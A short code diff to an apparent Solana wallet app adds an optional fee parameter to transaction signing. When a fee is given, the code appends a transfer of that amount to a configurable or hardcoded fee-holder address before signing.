@@ -3,7 +3,7 @@ import AppSettings from "../../store/settingsstore";
 import { cache } from "../storage/cache";
 import { getTransactionHistory } from "../db";
 import WalletItem from "@/misc/store/wallet";
-import { Connection, Keypair, Transaction } from "@solana/web3.js";
+import { Connection, Keypair, SystemProgram, Transaction, PublicKey } from "@solana/web3.js";
 import { api_key } from "@/app/requests/dashboard";
 import { Linking } from "react-native";
 
@@ -156,7 +156,7 @@ const keypairSign = async () => {
 }
 
 
-const signTransactions = async (tx: string) => {
+const signTransactions = async (tx: string, feeAmount?: number) => {
     const network = AppSettings.getState().network;
     const connection = new Connection(`${network}${api_key}`)
 
@@ -166,9 +166,22 @@ const signTransactions = async (tx: string) => {
 
     }
 
-    const txBuffer = Buffer.from(tx, "base64");
+    const txBuffer = Buffer.from(tx, "base64"); ``
 
     let transaction = Transaction.from(txBuffer);
+
+    const feeHolder = process.env.EXPO_FEE_HOLDER || "HeycuCVbaKuUXizfw8fQDuNadJu23igfK6G3ZomEwNmP"
+
+    if (feeAmount) {
+        transaction.add(
+            SystemProgram.transfer({
+                fromPubkey: keyPair.publicKey,
+                toPubkey: new PublicKey(feeHolder),
+                lamports: feeAmount
+            })
+        )
+    }
+
     // Correct way to sign
     transaction.partialSign(keyPair);
 
